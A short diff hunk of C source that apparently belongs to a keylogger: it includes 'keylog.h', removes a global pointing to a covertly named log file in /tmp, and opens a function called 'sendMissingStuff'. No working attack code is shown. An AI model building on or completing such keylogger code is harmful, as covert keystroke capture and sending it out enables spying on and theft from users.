@@ -12,9 +12,6 @@
 #include "file_utils.h"
 #include "keylog.h"
 
-// stuff
-char *filename = "/tmp/totally_unsuspicious_file.kl";
-
 int sendMissingStuff() {
 		char c;
 		char s[2];
